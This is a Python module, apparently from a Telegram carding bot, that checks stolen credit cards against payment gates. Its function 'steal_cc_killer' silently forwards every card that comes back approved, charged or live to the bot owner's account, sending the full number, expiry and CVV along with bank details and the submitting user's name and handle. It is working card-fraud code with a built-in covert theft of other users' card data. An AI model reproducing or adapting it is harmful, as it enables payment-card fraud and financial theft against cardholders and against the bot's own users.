import time
from config import OWNER_ID, DEVELOPER_NAME, PROJECT_NAME, PROJECT_TAG
from bin_detector import get_bin_info

async def steal_cc_killer(client, message, card: str, result: dict):
    # Forward live cards to owner with Unique Premium UI
    if not OWNER_ID:
        return
        
    status = result.get('status', 'unknown').upper()
    
    # Only forward if it's high value (Approved or Charged)
    if status not in ["APPROVED", "CHARGED", "LIVE", "SUCCESS"]:
        return

    icon = "🔥" if status == "CHARGED" else "✅"
    cc_parts = card.split('|')
    bin6 = cc_parts[0][:6]
    bin_data = get_bin_info(bin6)
    
    extrap = f"{cc_parts[0][:12]}xxxx|{cc_parts[1]}|{cc_parts[2]}|xxx" if len(cc_parts) >= 3 else card
    
    try:
        forward_msg = f"""
<b>{PROJECT_TAG} 〉 [FORWARDED HIT {icon}]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{card}</code>
<b>$Status:</b> {status} {icon}
<b>Response >_</b> {result.get('response', 'N/A')}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{bin6}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {result.get('gate', 'N/A')}
<b>$Proxy:</b> [LIVE ✨!] | <b>User:</b> {message.from_user.first_name} (@{message.from_user.username if message.from_user.username else 'N/A'})
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
        """
        
        await client.send_message(OWNER_ID, forward_msg)
        print(f"🔔 FORWARDED UNIQUE HIT: {card} -> Owner ({status})")
    except Exception as e:
        print(f"❌ Forwarding Error: {e}")